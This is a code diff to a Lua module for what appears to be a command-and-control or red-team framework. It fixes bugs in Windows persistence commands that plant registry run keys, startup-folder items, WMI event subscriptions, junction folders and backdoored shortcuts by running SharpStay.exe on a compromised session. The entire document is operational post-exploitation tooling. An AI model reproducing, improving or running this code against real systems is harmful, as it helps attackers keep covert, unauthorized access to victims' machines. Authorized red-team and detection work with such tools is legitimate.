@@ -54,14 +54,13 @@ local function add_custom_file_flags(cmd)
 end
 
 local function run_Registry_Key(cmd, args)
-    local regkeyname, command, drop_location, custom_file_content,
-          template, registry_key, clean_up
+    local session = active()
     local reg_key_name = cmd:Flags():GetString("reg_key_name")
     local command = cmd:Flags():GetString("command")
     local drop_location = cmd:Flags():GetString("drop_location")
     local registry_key = cmd:Flags():GetString("registry_key")
-    local session = active()
 
+    local regkeyname
     if reg_key_name ~= "" then
         regkeyname = reg_key_name
     else
@@ -87,8 +86,13 @@ local function run_Registry_Key(cmd, args)
 
     local hive, path
     if registry_key ~= "" then
-        hive = strings.split(registry_key,"\\")[1]
-        path = strings.split(registry_key,"\\")[1]
+        local parts = strings.split(registry_key,"\\")
+        hive = parts[1]
+        local path_parts = {}
+        for i = 2, #parts do
+            table.insert(path_parts, parts[i])
+        end
+        path = table.concat(path_parts, "\\")
     end
 
     return reg_add(session, hive, path, regkeyname, "REG_SZ", command)
@@ -198,7 +202,7 @@ cmd_service_install:Flags():String("command", persistdefaults.command,
                                    "Command to execute via the registry key")
 
 local function run_startup_folder(cmd, args)
-    local use_current_user = cmd:Flags():GetString(
+    local use_current_user = cmd:Flags():GetBool(
                                  "use_current_user_startupfolder")
     local filename = cmd:Flags():GetString("filename")
     local session = active()
@@ -260,7 +264,7 @@ local function run_wmi_event(cmd, args)
 
     local sharpstay = "StayKit/SharpStay.exe"
 
-    sharp_args = {
+    local sharp_args = {
         "action=WMIEventSub", "eventname=" .. eventname, "attime=" .. attime,
         "command=" .. command
     }
@@ -296,7 +300,7 @@ local function run_JunctionFolder(cmd, args)
         uploadraw(session, custom_file_content, drop_location, "0644", false)
     end
 
-    sharp_args = {
+    local sharp_args = {
         "action=JunctionFolder", "dllpath=" .. dllpath, "guid=" .. guid
     }
 
@@ -340,7 +344,7 @@ local function run_newlnk(cmd, args)
         uploadraw(session, custom_file_content, drop_location, "0644", false)
     end
 
-    sharp_args = {
+    local sharp_args = {
         "action=NewLnk", "filepath=" .. filepath, "lnkname=" .. lnkname,
         "lnktarget=" .. lnktarget, "lnkicon=" .. lnkicon, "command=" .. command
     }
@@ -389,7 +393,7 @@ local function run_backdoorlnk(cmd, args)
         uploadraw(session, custom_file_content, drop_location, "0644", false)
     end
 
-    sharp_args = {
+    local sharp_args = {
         "action=BackdoorLnk", "lnkpath=" .. lnkpath, "command=" .. command
     }
     local file_path = "StayKit/SharpStay.exe"
